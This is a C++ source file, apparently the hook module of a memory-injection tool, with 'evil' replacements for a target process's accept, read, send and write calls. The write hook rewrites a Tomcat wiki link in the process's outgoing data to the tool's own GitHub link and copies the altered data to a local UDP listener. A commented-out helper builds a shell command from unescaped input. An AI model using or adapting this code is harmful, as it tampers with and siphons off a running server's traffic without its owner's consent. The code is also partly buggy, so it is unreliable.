#include "eviluser.h"

#include <stdlib.h>
#include <string.h>

#include <netinet/in.h>
#include <arpa/inet.h>

// void echo_printf(const char *src)
// {

//     char buffer[2560] = {0};
//     snprintf(buffer, sizeof(buffer), "echo \"%s\" >> /home/lmc/Desktop/zzz", src);
//     system(buffer);
// }

#define MAX_TMPBUFFER_SIZE 100000

EvilUser::EvilUser() :
    tmpBuffer(nullptr)
{}

EvilUser::~EvilUser()
{
    if (tmpBuffer)
        free(tmpBuffer);
}

ssize_t EvilUser::evilAccept(int sockfd, struct sockaddr *addr, socklen_t *addrlen)
{
    return 0;
}

ssize_t EvilUser::evilRead(int fd, void *&buf, size_t &count)
{
    return 0;
}

ssize_t EvilUser::evilSend(int sockfd, const void *&buf, size_t &len, int flags)
{
    return 0;
}

ssize_t EvilUser::evilWrite(int fd, const void *&buf, size_t &count)
{
    static int sockFd = 0;
    if (!sockFd)
    {
        sockFd=socket(AF_INET,SOCK_DGRAM,0);
    }

          struct sockaddr_in client;
    client.sin_family=AF_INET;
    client.sin_port=htons(11111);
    client.sin_addr.s_addr=inet_addr("127.0.0.1");
    

    if (!tmpBuffer)
        tmpBuffer = (char *)malloc(MAX_TMPBUFFER_SIZE);

    char *p = NULL;
    char *injectLink = "  https://github.com/lmclmc/mem-infector";
    char *wikiLink = "https://wiki.apache.org/tomcat/FrontPage";

    size_t retSize = 0;
    if ((p = (char *)strstr((const char *)buf, wikiLink)))
    {

      //  memcpy(tmpBuffer, buf, count);
        // int size = p -(char *)buf;
        
        // tmpBuffer[size] = 'V';
        // memcpy(tmpBuffer+size, buf+size+5, count-size-5);
     //   buf = tmpBuffer;
        // count = count-5;
        
      //  count = count+1;
        size_t tmpCount = 0;
        memset(tmpBuffer, 0, MAX_TMPBUFFER_SIZE);
        int injectLinkSize = strlen(injectLink);
        int wikiLinkSize = strlen(wikiLink);

        tmpCount += p - (char *)buf;
        memcpy(tmpBuffer, buf, tmpCount);
        
        
        memcpy(tmpBuffer + tmpCount, injectLink, injectLinkSize);
        tmpCount += injectLinkSize;
        
        memcpy(tmpBuffer + tmpCount, 
               p + wikiLinkSize, count - (p + wikiLinkSize - (char *)buf));

        tmpCount += count - (p - (char *)buf + wikiLinkSize);
        buf = tmpBuffer;
        retSize = tmpCount - count;
        count = tmpCount;

        sendto(sockFd, buf+10, count,0,(struct sockaddr*)&client,sizeof(client)); 
    }

    return retSize;
}